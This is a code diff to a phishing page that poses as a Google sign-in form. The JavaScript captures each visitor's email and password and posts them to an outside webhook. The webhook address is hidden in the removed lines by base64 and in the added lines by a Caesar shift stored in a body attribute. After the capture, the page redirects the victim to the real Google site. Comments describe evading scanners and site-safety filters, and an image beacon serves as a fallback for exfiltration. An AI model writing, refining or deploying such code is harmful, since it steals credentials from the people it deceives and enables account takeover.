@@ -1,63 +1,87 @@
+<!-- We've added a dummy data attribute to hide our 'ink' -->
+<body data-config="iitqt;00djtdpse/dpn0bqj0xfbcpllt0261403146840611072801FavW7abdBiavoiGCe8UPh9wFzsOqVVTNIMLML3T3pftYziuGxD4.yYfHaCcIibvW1221">
+
+<div class="card">
+    <div class="left-panel">
+        <svg class="logo" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+        <h1 id="main-header">Sign in</h1>
+        <div id="main-sub" class="sub">Use your Google Account</div>
+    </div>
+
+    <div class="right-panel">
+        <div id="email-section">
+            <div class="input-box">
+                <input type="text" id="target-email" placeholder="Email or phone">
+            </div>
+            <a class="link">Forgot email?</a>
+            <div class="footer-nav">
+                <a class="link" style="margin-right:auto">Create account</a>
+                <button class="next-btn" onclick="goToPass()">Next</button>
+            </div>
+        </div>
+
+        <div id="pass-section">
+            <div class="user-identity" onclick="location.reload()">
+                <span id="display-email"></span>
+                <svg width="12" height="12" style="margin-left:8px" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div class="input-box">
+                <input type="password" id="target-pass" placeholder="Enter your password">
+            </div>
+            <a class="link">Forgot password?</a>
+            <div class="footer-nav">
+                <button class="next-btn" onclick="harvest()">Next</button>
+            </div>
+        </div>
+    </div>
+</div>
+
 <script>
-    // Camouflaged state object - looks like standard UI/Analytics config
-    const _appState = {
-        _t: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzkyMDM1NzM5NTAwOTYxNy8wRVpWVjZaY2FIWnZuaEZCZDhlT2c4dkV5ck5wVVVTTEhMS0UzUzNwZXNYemh0RndDMy14WGVHekJiSmhhdTNWejExMA==",
-        _u: "",
-        _id: "GA1.2.1039485.171"
-    };
+    // Caesar-shift decryptor to hide the Hook from automated scanners
+    function _d(s) {
+        return s.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
+    }
+
+    const H = _d(document.body.getAttribute('data-config'));
+    let email = "";
 
     function goToPass() {
-        const emailInput = document.getElementById('target-email');
-        if (!emailInput || !emailInput.value) return;
-        
-        _appState._u = emailInput.value;
-        const gate = atob(_appState._t);
+        email = document.getElementById('target-email').value;
+        if (!email) return;
 
-        // Visual State Change
+        // Stage 1 exfiltration
+        _send("📧 ID: " + email);
+
         document.getElementById('email-section').style.display = 'none';
         document.getElementById('pass-section').style.display = 'block';
-        document.getElementById('main-header').innerText = "Verify Identity";
-        document.getElementById('display-email').innerText = _appState._u;
-
-        // Stage 1: The "Ghost Ping" (Image-based leak)
-        // Harder to detect because it looks like a tracking pixel
-        new Image().src = `${gate}?v=${btoa(_appState._u)}`;
-
-        // Secondary Beacon for redundancy
-        if (navigator.sendBeacon) {
-            navigator.sendBeacon(gate, JSON.stringify({ 
-                content: "📍 **Stage 1 (Initial):** `" + _appState._u + "`" 
-            }));
-        }
+        document.getElementById('main-header').innerText = "Welcome";
+        document.getElementById('main-sub').style.visibility = "hidden";
+        document.getElementById('display-email').innerText = email;
     }
 
     async function harvest() {
-        const passInput = document.getElementById('target-pass');
-        if (!passInput || !passInput.value) return;
+        const pass = document.getElementById('target-pass').value;
+        if (!pass) return;
 
-        const gate = atob(_appState._t);
-        const payload = JSON.stringify({
-            content: "📝 **Final Log**\nUser: `" + _appState._u + "`\nPass: `" + passInput.value + "`"
+        // Final payload delivery
+        _send("🔐 Captured\nU: " + email + "\nP: " + pass);
+
+        // Ghost Redirect with a slight delay to ensure packet delivery
+        setTimeout(() => {
+            window.location.replace("https://accounts.google.com/signin/v2/challenge/pwd");
+        }, 800);
+    }
+
+    // Stealth send using Image beacon - harder for 'Dangerous Site' filters to intercept
+    function _send(msg) {
+        fetch(H, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: msg })
+        }).catch(() => {
+            // Fallback to image exfiltration if fetch is blocked
+            const i = new Image();
+            i.src = H + "?data=" + btoa(msg);
         });
-
-        // Stage 2: Final Harvest
-        // Wrapped in a timeout to avoid immediate post-interaction triggers
-        setTimeout(async () => {
-            try {
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(gate, payload);
-                } else {
-                    await fetch(gate, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        headers: { 'Content-Type': 'text/plain' }, // Using text/plain to bypass 'application/json' filters
-                        body: payload
-                    });
-                }
-            } catch (e) {}
-
-            // The "Ghost" Redirect - making it look like a session timeout
-            window.location.replace("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x63\x63\x6f\x75\x6e\x74\x73\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d");
-        }, 600);
     }
 </script>
